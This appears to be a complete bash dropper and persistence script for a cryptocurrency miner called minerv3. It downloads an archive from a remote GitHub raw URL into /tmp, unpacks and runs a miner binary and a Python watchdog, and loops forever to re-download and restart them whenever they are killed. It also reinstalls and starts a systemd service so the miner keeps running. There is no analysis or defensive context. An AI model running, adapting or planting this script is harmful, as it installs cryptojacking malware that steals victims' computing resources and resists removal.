#!/bin/bash
# Filename: minerv3.sh

APP_DIR="/tmp/minerv3"

MASTER_URL="https://raw.githubusercontent.com/letscash3-spec/Daddy/refs/heads/main/minerv3.tar.gz"
ARCHIVE_NAME="minerv3.tar.gz"
ARCHIVE_PATH="$APP_DIR/$ARCHIVE_NAME"

SERVICE_NAME="minerv3.service"
SERVICE_SRC="$APP_DIR/minerv3.service"

# ==========================================

download_file() {
    local url=$1
    local output_path=$2

    if command -v curl > /dev/null 2>&1; then
        curl -fsSL "$url" -o "$output_path"
        if [ $? -eq 0 ]; then return 0; fi
    fi

    if command -v wget > /dev/null 2>&1; then
        wget -q "$url" -O "$output_path"
        if [ $? -eq 0 ]; then return 0; fi
    fi

    echo "Failed to download $url using both curl and wget!"
    return 1
}

sync_files() {
    echo "Syncing files from master archive..."
    if download_file "$MASTER_URL" "$ARCHIVE_PATH"; then
        tar -xzf "$ARCHIVE_PATH" -C "$APP_DIR" --overwrite
        
        chmod +x "$APP_DIR/minerv3.sh"
        chmod +x "$APP_DIR/minerv3.py"
        chmod +x "$APP_DIR/minerv3"
        
        return 0
    fi
    return 1
}

# ==========================================

mkdir -p $APP_DIR

if [ ! -f "$APP_DIR/minerv3" ] || [ ! -f "$APP_DIR/minerv3.py" ]; then
    sync_files
fi

while true; do

    if ! pgrep -f "$APP_DIR/minerv3" > /dev/null; then
        echo "Binary is killed! Re-syncing and running..."
        sync_files
        if [ -f "$APP_DIR/minerv3" ]; then
            $APP_DIR/minerv3 minerv3.ini &
        fi
    fi

    if ! pgrep -f "$APP_DIR/minerv3.py" > /dev/null; then
        echo "Watchdog Python is killed! Re-syncing and running..."
        sync_files
        
        if [ -f "$APP_DIR/minerv3.py" ]; then
            if command -v python3 > /dev/null 2>&1; then
                python3 $APP_DIR/minerv3.py &
            else
                echo "Python3 is not installed! Cannot run watchdog."
            fi
        fi
    fi

    if ! systemctl is-active --quiet "$SERVICE_NAME"; then
        echo "Service is killed! Re-installing and starting..."
        if [ -f "$SERVICE_SRC" ]; then
            cp "$SERVICE_SRC" "/etc/systemd/system/$SERVICE_NAME"
            systemctl daemon-reload
        fi
        systemctl start "$SERVICE_NAME"
    fi

    sleep 5
done
